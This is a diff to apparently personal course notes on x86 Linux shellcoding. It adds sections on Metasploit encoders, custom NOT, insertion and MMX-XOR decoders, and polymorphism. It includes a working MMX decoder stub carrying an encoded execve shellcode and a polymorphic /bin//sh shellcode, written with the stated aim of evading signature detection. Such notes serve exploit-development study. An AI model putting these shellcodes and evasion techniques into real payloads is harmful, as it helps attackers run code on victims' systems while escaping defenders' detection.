@@ -241,7 +241,7 @@ operation has completed in hello world as the value "4" has been moved into eax 
 
 So, We can check what is next with disassemble, then stepi, and info regsisters/i r again to see it has completed the instruction EG if the instruction was
 "mov    ecx,0x80490a4" (in our program this was defined as mov ecx, message, when it runs in assembly it looks at the memory address where our "message" variable is stored, 
-when disassembling, we can confirm conents of message with x/s <memaddress>),
+when disassembling, we can confirm contents of message with x/s <memaddress>),
  then we should see that memory address
 
 **BONUS NOTE**
@@ -679,6 +679,13 @@ Your shellcode can be added into an executable which means that:
 check for nulls in your binary with
     objdump -d execve -M intel
 
+#### Shellcode encoding flow:
+* Run magic string against compiled binary containing your instruction eg ////bin/bash
+* place the pulled shellcode into your test binary, compile and run TO MAKE SURE THE CODE IS GOOD
+* paste the good code into your python encoder and run
+* copy the encoded shellcode and note the length
+* place the code into your template as EncodedShellcode: db
+* jmp-call-pop to retrieve, decode and execute
 
 ## Shellcoding: JMP-CALL-POP
 
@@ -788,8 +795,10 @@ _start:
     code = '<your string>'
     code[::-1]
 Then it needs to be converted to hex, so: 
+
     code[::-1].encode('hex')
 Once we have our hex string, we push onto stack in 4byte increments:
+
     push 0x0a646c72
     push 0x6f57206f
     push 0x6c6c6548
@@ -834,3 +843,143 @@ decode:
 	inc esi
 	jmp short decode
 ```
+## Working with metasploit
+
+List payloads: mesfpayload -l | grep "linux/x86"
+List encoders: msfencode options -l
+Encode your own payload: echo -ne "YOUR_SHELLCODE" " msfencode -a <x86/x64> -t <c,py,rb etc> -e <the encdoer EG x86/jmp_call_additive>
+
+## Encoding
+In the real world, metasploit encoders will get caught.
+Known encoding types will also get caught.
+These generally get caught either by the Encode or Decode stub.
+To have an effective encoder for your payload, it needs to be custom made and not a known encoding type
+
+#### NOT encoding
+>will transform every byte in shellcode using NOT
+>Decoder will NOT the encoded byte to get the original byte
+>Control will be passed to decoded shellcode
+
+#### Insertion Encoding
+>will insert random characters
+>then remove them
+>same concept as NOT and XOR encoding
+
+#### Decoding with MMX 
+>using uncommon instructions in your shellcode has obvious advantages
+>existing shellcodes hardly use them (less detection rate)
+>easy to replicate existing functionality using these extensions
+
+**Key points for MMX based XOR decoder**
+* SIMD - Single instruction multiple data (operate over 8bytes)
+* Use Registers MM0 to MM7 (can load 64bits of data)
+* can load 8bytes qword
+* XORing Data -pxor
+* MOVing Date - movq
+* MAIN DIFFERENCE FROM NORMAL XOR DECODER is that it operates over 8 bytes at the same time EG when your XOR/NOT/AND in your decoder, **you work with 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa rather than just 0xaa**
+* when looping to decode, we want to divide length by 8, and result rounded up will be what we put into cl.
+
+EXAMPLE BELOW:
+```
+global _start			
+
+section .text
+_start:
+
+	jmp short call_decoder ; you know the drill by now
+
+decoder:
+	pop edi ; next instruction after jump is decoder_value, pop'd into edi
+	lea esi, [edi +8] ; after 8bytes in esi is our shellcode, so the +8 means we are loading the address of shellcode into esi
+	xor ecx, ecx ; create null in ecx
+	mov cl, 4 ; 25 div by 8 is just over 3 so round up to 4 for our loop (remember how we always put a null at the end of our execve code? well that is why we are able to iterate beyond the byte length)
+
+
+decode:
+	movq mm0, qword [edi] ; mov our key stored in edi into mm0
+	movq mm1, qword [esi] ; move our shellcode in esi imto mm1	
+	pxor mm0, mm1 ; xor our encoded shellcode back to original value and store in mm0
+	movq qword [esi], mm0 ; overwrite encoded with decoded shellcode
+	add esi, 0x8 ; readjust stack
+	loop decode
+
+	jmp short EncodedShellcode ; after we iterate 4 times we pass control to shellcode
+
+
+call_decoder:
+
+	call decoder
+	decoder_value: db 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa
+	EncodedShellcode: db 0x9b,0x6a,0xfa,0xc2,0x85,0x85,0xd9,0xc2,0xc2,0x85,0xc8,0xc3,0xc4,0x23,0x49,0xfa,0x23,0x48,0xf9,0x23,0x4b,0x1a,0xa1,0x67,0x2a
+```
+
+## Polymorphism
+
+* Shellcode can be fingerprinted easily
+* Something to note is the decoder and decrypter stubs can be fingerprinted easily also.
+* The values of what get pushed on the stack can also obviously be ID'd, aswell as PUSHing values on.
+
+#### SO, the goal iS:
+
+* To make our shellcode look different everytime we create it
+* Maintain the same functionality
+* Have semantically equivalent instructions
+* Make Detection MUCH more difficult (the above achieves that)
+
+**^^^ we do all this with POLYMORPHISM**
+
+#### Basic Principles of Polymorphic shellcode
+
+We want to replace instructions with equivalent functionlaity
+We want to add garbage instructions that do not affect the code IE NOP equivalents **NOP sleds are one of the most detectable fingerprints**
+
+#### Addressing the fingerprinting
+instead of pushing on the same value, use MOV, or CP, and utilise arithmetic
+
+```
+global _start			
+
+section .text
+_start:
+
+	; PUSH the first null dword 
+	; xor eax, eax
+	mov ebx, eax
+	xor eax, ebx
+
+
+	; push eax
+
+	mov dword [esp-4], eax
+	sub esp, 4
+
+
+	; mov dword [esp-4], 0x68732f2f
+	cld ; garbage instruction
+	mov esi, 0x57621e1e ; move a value on that is 1 less on each
+	add esi, 0x11111111 ; only do add 1 back on each to bring it back to what it would have been
+	mov dword [esp-4], esi
+	std ; garbage instruction
+
+
+	mov dword [esp-8], 0x6e69622f
+	sub esp, 8
+
+	;push 0x68732f2f
+	; push 0x6e69622f
+
+
+	mov ebx, esp
+
+	push eax
+	mov edx, esp
+
+	push ebx
+	mov ecx, esp
+
+
+	mov al, 11
+	int 0x80
+```
+
+## Analyzing Shellcode
